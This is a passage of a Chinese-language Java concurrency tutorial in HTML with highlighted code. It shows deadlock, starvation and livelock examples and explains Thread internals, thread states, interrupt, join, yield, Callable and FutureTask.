class=\"number\">1</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        b.method();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title function_\">method</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;任务A&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TaskB</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title function_\">method</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;任务B&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title function_\">method</span><span class=\"params\">(TaskA a)</span>&#123;</span><br><span class=\"line\">        a.method();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">TaskA</span> <span class=\"variable\">taskA</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TaskA</span>();</span><br><span class=\"line\">        <span class=\"type\">TaskB</span> <span class=\"variable\">taskB</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TaskB</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(() -&gt; taskA.method(taskB)).start();</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(()-&gt; taskB.method(taskA)).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>打开jvisualvm（JAVA_HOME&#x2F;bin&#x2F;jvisualvm）可以看到线程死锁了。<br><img src=\"/images/old/20171211%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-12-11%E4%B8%8B%E5%8D%886.32.25.png\"><br>饥饿举例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.concurrent.TimeUnit;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ProcessThread</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span>&#123;</span><br><span class=\"line\">    JProgressBar progressBar;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> JProgressBar <span class=\"title function_\">getProgressBar</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> progressBar;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">ProcessThread</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        progressBar = <span class=\"keyword\">new</span> <span class=\"title class_\">JProgressBar</span>();</span><br><span class=\"line\">        progressBar.setString(name);</span><br><span class=\"line\">        progressBar.setStringPainted(<span class=\"literal\">true</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">synchronized</span> (Main.shareObj)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (c == <span class=\"number\">100</span>)&#123;</span><br><span class=\"line\">                    c = <span class=\"number\">0</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                c = c+ <span class=\"number\">10</span>;</span><br><span class=\"line\">                progressBar.setValue(c);</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//此处线程暂停，不释放锁，每次结束后由系统重新竞争锁，很大可能还是当前线程获取到锁。（偏向锁）</span></span><br><span class=\"line\">                    <span class=\"comment\">//在设计的时候，如果设计任务优先级执行，可能会重新高优先级任务一直运行</span></span><br><span class=\"line\">                    TimeUnit.MILLISECONDS.sleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">                    <span class=\"comment\">//修改为下面的后，线程会暂停，释放锁，其他线程可以重新竞争锁，且当前线程不参与竞争。</span></span><br><span class=\"line\"><span class=\"comment\">//                    Main.shareObj.wait(100);</span></span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">Object</span> <span class=\"variable\">shareObj</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">JFrame</span> <span class=\"variable\">starvation</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">JFrame</span>(<span class=\"string\">&quot;Starvation&quot;</span>);</span><br><span class=\"line\">        starvation.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\">        starvation.setSize(<span class=\"number\">300</span>, <span class=\"number\">200</span>);</span><br><span class=\"line\">        starvation.setLayout(<span class=\"keyword\">new</span> <span class=\"title class_\">FlowLayout</span>(FlowLayout.LEFT));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; i &lt; <span class=\"number\">5</span>; i++) &#123;</span><br><span class=\"line\">            <span class=\"type\">ProcessThread</span> <span class=\"variable\">processThread</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ProcessThread</span>(<span class=\"string\">&quot;Thread-&quot;</span> + i);</span><br><span class=\"line\">            starvation.add(processThread.getProgressBar());</span><br><span class=\"line\">            <span class=\"type\">Thread</span> <span class=\"variable\">thread</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(processThread);</span><br><span class=\"line\">            thread.start();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        starvation.setLocationRelativeTo(<span class=\"literal\">null</span>);</span><br><span class=\"line\">        starvation.setVisible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>该例子可能并不恰当，不过饥饿很好理解。</li>\n<li>通过图形化展示比较有趣，参考：<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5sb2dpY2JpZy5jb20vdHV0b3JpYWxzL2NvcmUtamF2YS10dXRvcmlhbC9qYXZhLW11bHRpLXRocmVhZGluZy90aHJlYWQtc3RhcnZhdGlvbi8=\">http://www.logicbig.com/tutorials/core-java-tutorial/java-multi-threading/thread-starvation/<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n<p>活锁举例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 银行账户</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">BankAccount</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> String name;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">double</span> balance;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">getName</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setName</span><span class=\"params\">(String name)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">double</span> <span class=\"title function_\">getBalance</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> balance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setBalance</span><span class=\"params\">(<span class=\"type\">double</span> balance)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.balance = balance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">BankAccount</span><span class=\"params\">(String name, <span class=\"type\">double</span> balance)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.balance = balance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">Lock</span> <span class=\"variable\">lock</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ReentrantLock</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 取钱</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> amount</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"type\">boolean</span> <span class=\"title function_\">drawMoney</span><span class=\"params\">(<span class=\"type\">double</span> amount)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">this</span>.lock.tryLock())&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                TimeUnit.MILLISECONDS.sleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">                balance -= amount;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                lock.unlock();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 存钱</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> amount</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"type\">boolean</span> <span class=\"title function_\">saveMoney</span><span class=\"params\">(<span class=\"type\">double</span> amount)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">this</span>.lock.tryLock())&#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                TimeUnit.MILLISECONDS.sleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">                balance += amount;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                lock.unlock();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 转账</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> destinationAccount</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> amount</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">transfer</span><span class=\"params\">(BankAccount destinationAccount, <span class=\"type\">double</span> amount)</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * 1. 先扣除当前账户</span></span><br><span class=\"line\"><span class=\"comment\">         * 2. 给目标账户加钱</span></span><br><span class=\"line\"><span class=\"comment\">         * 3. 目标账户加钱失败，回滚</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">this</span>.drawMoney(amount))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (destinationAccount.saveMoney(amount))&#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"built_in\">this</span>.saveMoney(amount);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">TransferMoney</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> BankAccount sourceAccount, destinationAccount;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">double</span> amount;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">TransferMoney</span><span class=\"params\">(BankAccount sourceAccount, BankAccount destinationAccount, <span class=\"type\">double</span> amount)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.sourceAccount = sourceAccount;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.destinationAccount = destinationAccount;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.amount = amount;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (!sourceAccount.transfer(destinationAccount, amount))&#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;转账失败！！！重试&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;%s 余额 %.2f\\t&quot;</span>, sourceAccount.getName(), sourceAccount.getBalance());</span><br><span class=\"line\">        System.out.printf(<span class=\"string\">&quot;%s 余额 %.2f\\t&quot;</span>, destinationAccount.getName(), destinationAccount.getBalance());</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;转账成功！！！&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">BankAccount</span> <span class=\"variable\">accountMing</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BankAccount</span>(<span class=\"string\">&quot;小明&quot;</span>, <span class=\"number\">10000.00</span>);</span><br><span class=\"line\">        <span class=\"type\">BankAccount</span> <span class=\"variable\">accountRed</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BankAccount</span>(<span class=\"string\">&quot;小红&quot;</span>, <span class=\"number\">20000.00</span>);</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">TransferMoney</span>(accountMing, accountRed, <span class=\"number\">5000</span>), <span class=\"string\">&quot;明-&gt;红&quot;</span>).start();</span><br><span class=\"line\">        TimeUnit.MILLISECONDS.sleep(<span class=\"number\">50</span>);</span><br><span class=\"line\">        <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">TransferMoney</span>(accountRed, accountMing, <span class=\"number\">5000</span>), <span class=\"string\">&quot;红-&gt;明&quot;</span>).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>活锁不易察觉，活锁是有可能自己解开的，一般情况下存在活锁时，CPU会增高，可以通过日志记录来排查活锁。</li>\n</ul>\n<p><strong>阿姆达尔定律、Gustafson</strong><br>阿姆达尔定律：<span class=\"exturl\" data-url=\"aHR0cDovL2lmZXZlLmNvbS9hbWRhaGxzLWxhdy8=\">http://ifeve.com/amdahls-law/<i class=\"fa fa-external-link-alt\"></i></span><br>参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vNzU2NjIzNjA3LXpoYW5nL3AvNjg1MDg0OC5odG1s\">https://www.cnblogs.com/756623607-zhang/p/6850848.html<i class=\"fa fa-external-link-alt\"></i></span></p>\n<h3 id=\"Java线程\"><a href=\"#Java线程\" class=\"headerlink\" title=\"Java线程\"></a>Java线程</h3><p>在Java中使用线程有两种方式</p>\n<ol>\n<li>实现Runnable接口</li>\n<li>继承Thread重写run方法<br>因为Java不支持多继承，多数情况下使用第一种方法。</li>\n</ol>\n<h4 id=\"Thread小析\"><a href=\"#Thread小析\" class=\"headerlink\" title=\"Thread小析\"></a>Thread小析</h4><p>Thread实际也实现了Runnable，同时拥有一个Runnable属性target，Thread实现的run方法实际是调用target的run方法。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Thread.java</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (target != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        target.run();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在new Thread的时候，会调用init初始化：</p>\n<ol>\n<li>设置线程名称</li>\n<li>设置线程组（如未设置，默认为安全管理器SecurityManager所在的线程组，如果SecurityManager线程组不存在，则设置为当前线程所在的线程组）</li>\n<li>权限校验（创建的线程对线程组的权限）</li>\n<li>设置新线程预计堆栈大小（默认0表示忽略堆栈大小）</li>\n<li>设置优先级、是否守护线程（默认同父线程）、目标类等相关操作</li>\n</ol>\n<p>线程创建完成后，通过start启动线程。在启动线程前，可以通过setDaemon设置当前线程为守护线程。通过start启动后，最后会调用私有native方法start0，由虚拟机启动线程，调用run方法。在run方法执行完毕后，线程会自动关闭。</p>\n<ul>\n<li>守护线程，当正在运行的线程都是守护线程时，Java 虚拟机退出。且守护线程创建的线程默认为守护线程，可在start前修改。</li>\n</ul>\n<p>线程在创建到结束，总共有6个状态：</p>\n<ul>\n<li>NEW：线程创建完成，但还未启动。</li>\n<li>RUNNABLE：线程正在运行，在该状态时表示当前线程正在JVM中执行，但它可能正在等待操作系统中的其他资源，等待获取处理器调用</li>\n<li>BLOCKED：受阻塞并且正在等待监视器锁的某一线程的线程状态。处于受阻塞状态的某一线程正在等待监视器锁，以便进入一个同步的块&#x2F;方法</li>\n<li>WAITING：不带超时线程等待状态，（不带超时的Object.wait、Thread.join、LockSupport.park都会导致线程进入该状态）</li>\n<li>TIMED_WAITING：带超时的等待状态（Thread.sleep、Object.wait、Thread.join、LockSupport.parkNanos、LockSupport.parkUntil都会导致线程进入该状态）</li>\n<li>TERMINATED：线程终止状态，表示线程已经执行完成。</li>\n</ul>\n<p>Thread.interrupt()线程中断:<br>调用该方法后，并不是直接中断异常，如果线程内部未对中断进行处理，实际上中断无效。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Thread</span> <span class=\"variable\">thread</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(() -&gt; &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">j</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>; j &lt;= <span class=\"number\">10</span>; j++) &#123;</span><br><span class=\"line\">        i = i * j;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    System.out.println(i);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">thread.start();</span><br><span class=\"line\">thread.interrupt();</span><br></pre></td></tr></table></figure>\n<p>上诉例子中，线程永远都会计算完成后才结束。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Thread</span> <span class=\"variable\">thread</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(() -&gt; &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"literal\">true</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (Thread.interrupted())&#123;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        i++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    System.out.println(i);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">thread.start();</span><br><span class=\"line\">TimeUnit.MILLISECONDS.sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\">thread.interrupt();</span><br></pre></td></tr></table></figure>\n<p>在该例子中，线程内部有对中断状态进行处理，当线程发出中断信号后，会退出循环。Thread.interrupted方法会清除当前线程的中断状态。<br>需要注意的是，当线程为休眠（sleep或者wait）状态时，如果发出中断信号，会导致抛出InterruptedException异常，必须捕获处理。</p>\n<p>Thread.join()等待该线程终止：<br>当线程之间需要协同操作时，当前线程需要等待其他完成后才能继续操作，可以采用join方法。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Thread[] threads = <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>[<span class=\"number\">10</span>];</span><br><span class=\"line\">threads[<span class=\"number\">0</span>] = Thread.currentThread();</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>; i &lt; threads.length; i++) &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">j</span> <span class=\"operator\">=</span> i;</span><br><span class=\"line\">    threads[i] = <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(()-&gt;&#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            threads[j - <span class=\"number\">1</span>].join();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (InterruptedException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        System.out.println(Thread.currentThread().getName());</span><br><span class=\"line\">    &#125;, <span class=\"string\">&quot;Thread-&quot;</span> + i);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> <span class=\"number\">1</span>; i &lt; threads.length; i++) &#123;</span><br><span class=\"line\">    threads[i].start();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在该例子中，每个线程都是等上一个线程完成后(join)，在执行后续的操作。输出结果如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Thread-1</span><br><span class=\"line\">Thread-2</span><br><span class=\"line\">Thread-3</span><br><span class=\"line\">Thread-4</span><br><span class=\"line\">Thread-5</span><br><span class=\"line\">Thread-6</span><br><span class=\"line\">Thread-7</span><br><span class=\"line\">Thread-8</span><br><span class=\"line\">Thread-9</span><br></pre></td></tr></table></figure>\n<p>如果不使用join，每个线程执行顺序是被打乱的。实际上join内部是通过wait来实现。</p>\n<p>Thread.yield()暂停当前正在执行的线程对象，并执行其他线程：<br>调用该方法后，表示使当前线程让出CPU，让CPU重新分配执行线程，该线程会与其他线程继续竞争CPU资源。</p>\n<h3 id=\"线程返回Callable\"><a href=\"#线程返回Callable\" class=\"headerlink\" title=\"线程返回Callable\"></a>线程返回Callable</h3><p>之前实现的Runnable没有返回值。如果需要线程执行完毕后由返回值，可以使用Callable。<br>通常Callable和Futura一起使用，Callable计算处理返回结果，通过Futura获取Callable的返回值。举例：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//创建callable，实现call方法，并返回</span></span><br><span class=\"line\">FutureTask&lt;String&gt; futureTask = <span class=\"keyword\">new</span> <span class=\"title class_\">FutureTask</span>&lt;&gt;(() -&gt; <span class=\"string\">&quot;call&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(futureTask).start();</span><br><span class=\"line\"><span class=\"comment\">//等待线程执行完毕</span></span><br><span class=\"line\">TimeUnit.SECONDS.sleep(<span class=\"number\">1</span>);</span><br><span class=\"line\"><span class=\"comment\">//输出返回值</span></span><br><span class=\"line\">System.out.println(futureTask.get());</span><br></pre></td></tr></table></figure>\n<p>采用FutureTask的原因是因为，FutureTask实现了Runnable、Future两个接口。</p>\n<h4 id=\"小析FutureTask\"><a href=\"#小析FutureTask\" class=\"headerlink\" title=\"小析FutureTask\"></a>小析FutureTask</h4><p>FutureTask有个Callable属性，由构造方法传入，或者由Executors生成Callable。outcome属性，存储Callable返回值<br>FutureTask拥有7个状态：</p>\n<ul>\n<li>NEW：新建</li>\n<li>COMPLETING：运行中</li>\n<li>NORMAL：正常</li>\n<li>EXCEPTIONAL：异常</li>\n<li>CANCELLED：取消</li>\n<li>INTERRUPTING：中断中</li>\n<li>INTERRUPTED：被中断</li>\n</ul>\n<p>状态变化有4种情况：</p>\n<ul>\n<li>NEW -&gt; COMPLETING -&gt; NORMAL</li>\n<li>NEW -&gt; COMPLETING -&gt; EXCEPTIONAL</li>\n<li>NEW -&gt; CANCELLED</li>\n<li>NEW -&gt; INTERRUPTING -&gt; 